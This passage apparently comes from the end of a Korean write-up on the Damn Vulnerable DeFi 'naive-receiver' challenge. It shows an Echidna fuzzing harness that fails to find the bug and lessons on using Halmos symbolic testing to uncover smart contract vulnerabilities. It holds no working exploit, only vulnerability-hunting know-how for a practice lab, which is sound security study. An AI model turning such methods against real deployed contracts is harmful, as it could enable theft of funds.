sender: ['0xcafe0002']
allContracts: true
workers: 8
```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./POCTarget.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCFuzzing is Test {
    POCTarget target;
    address deployer = makeAddr("deployer");

    constructor() public payable {
        target = new POCTarget();
    }

    function echidna_isWorking() public returns (bool) {
        return target.a() != 1;
    }
}
```
```javascript
echidna test/naive-receiver/POCEchidna.t.sol --contract POCEchidna --config test/naive-receiver/naive-receiver.yaml --test-limit 10000000
...
echidna_isWorking: passing
...
```
역시 작동하지 않습니다. 이 결과들은 Foundry와 Echidna 퍼징이 새로운 버그를 처리하지 못할 것임을 증명하기에 충분하다고 생각합니다.
## 결론
1. 경로 폭발은 심볼릭 분석의 정말 심각한 문제입니다. 우리는 가장 크지 않은 4개의 계약 설정을 가지고 있었지만, Halmos는 심각한 단순화 없이는 2개의 트랜잭션을 심볼릭하게 완료할 수 없었습니다.
2. Halmos는 도움 없이는 복잡한 문제를 해결해 주는 요술봉이 아닙니다. 대상 계약의 로직을 분석하여 단순화와 최적화를 사용해야 하며, 사용해야만 합니다. 때로는 그것 없이는 아무것도 작동하지 않을 수 있습니다. 중요한 것은 휴리스틱을 성공적으로 선택하는 것입니다. 이것은 성공적으로 발견된 취약점으로 보상받기 때문입니다.
3. 불변 조건을 만들 때, "예상치 못한 무언가를 할 수 있다면 - 본격적인 공격을 쉽게 찾을 수 있다"는 원칙을 따를 수 있습니다.
4. 언제 `svm.CreateCalldata()`를 사용하는 것이 더 좋고 언제 `svm.createBytes()`를 사용하는 것이 더 좋은지 이해하는 것이 중요합니다. 각각 고유한 적용 분야가 있습니다.
5. `withdraw()`->`_msgSender()` 함수에서 `svm.createBytes()`를 사용해야 한다는 강력한 힌트를 주었음에도 불구하고, Halmos는 Echidna나 Foundry와 달리 버그를 찾기 위해 원시 콜데이터를 처리하는 작업을 훌륭하게 수행했습니다. Naive-receiver의 새 버전은 퍼징으로 완전히 해결되지 않습니다.
## 다음 단계는?
다음 DVD 챌린지는 [Side-entrance](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)입니다.
